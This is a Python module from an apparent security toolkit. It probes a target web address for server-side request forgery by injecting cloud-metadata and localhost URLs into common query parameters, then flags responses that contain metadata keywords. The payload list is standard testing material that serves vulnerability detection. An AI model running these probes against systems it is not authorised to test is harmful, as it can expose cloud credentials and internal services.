# modules/web/ssrf_tester.py
from core.models import ToolResult, Finding, Severity

TOOL_INFO = {
    "name": "ssrf_tester",
    "category": "web",
    "description": "Server-Side Request Forgery detection via common parameter injection",
    "author": "CyberToolkit Pro",
    "version": "1.0.0",
    "args": [
        {"name": "target", "required": True, "description": "Target to analyze"},
    ],
    "tags": ['web', 'ssrf', 'vulnerability'],
}


def run(args):

    import urllib.request, urllib.error, urllib.parse, re
    target = args.get("target", "")
    if not target:
        return ToolResult(tool_name="ssrf_tester", status="error", error="No target specified")
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    data = {"target": target, "tests": [], "potential_ssrf": []}
    findings = []
    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://127.0.0.1:80", "http://localhost:22",
        "http://[::1]:80", "http://0.0.0.0:80",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]
    test_params = ["url", "redirect", "next", "link", "href", "src", "page", "file", "path", "callback"]
    for param in test_params[:5]:
        for payload in ssrf_payloads[:3]:
            test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    body = resp.read(5000).decode("utf-8", errors="replace")
                    status = resp.status
                    if any(indicator in body.lower() for indicator in ["ami-id", "instance-id", "meta-data", "hostname"]):
                        data["potential_ssrf"].append({"param": param, "payload": payload, "response_code": status})
                        findings.append(Finding(
                            title=f"Potential SSRF via parameter '{param}'",
                            severity=Severity.CRITICAL,
                            description=f"Cloud metadata indicators found when injecting SSRF payload into '{param}'",
                            remediation="Validate and sanitize all URL parameters; block internal IP ranges"
                        ))
            except Exception:
                pass
            data["tests"].append({"param": param, "payload": payload})
    return ToolResult(tool_name="ssrf_tester", target=target, status="success", data=data, findings=findings)

